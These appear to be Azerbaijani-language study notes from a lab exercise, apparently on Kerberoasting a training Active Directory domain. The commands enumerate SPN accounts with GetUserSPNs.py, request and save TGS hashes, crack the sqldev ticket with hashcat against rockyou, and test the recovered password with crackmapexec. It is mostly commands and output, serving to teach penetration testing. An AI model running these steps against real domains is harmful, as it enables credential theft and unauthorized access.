Kəşfiyyat: SPN Hesablarının Siyahısını Almaq (Get Accounts list which has ServicePrincipalName attribute)
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
INLANEFREIGHT.LOCAL/forend: Hücumu həyata keçirmək üçün istifadə olunan etibarlı domen hesabını (forend) və domenin adını (INLANEFREIGHT.LOCAL) təqdim edir.
Skript çalışdıqdan sonra parol soruşulur.

Biletləri Tələb Etmək və Çıxarmaq (Tapılmış SPN hesabları üçün Kerberos TGS biletlərini (şifrlənmiş heşləri) əldə etmək.)
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
Nəticə: Çıxışda hər bir SPN üçün siyahı təkrarlanır, ardınca isə sındırma alətləri üçün uyğun formatda olan (Hashcat-in mode 13100 formatı) şifrlənmiş heşlər görünür:

$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$...
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$...

Hədəf Biletləri Fayla Yazmaq
```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

Cracking offline
```shell
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

Testing Authentication against a Domain Controller

```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```






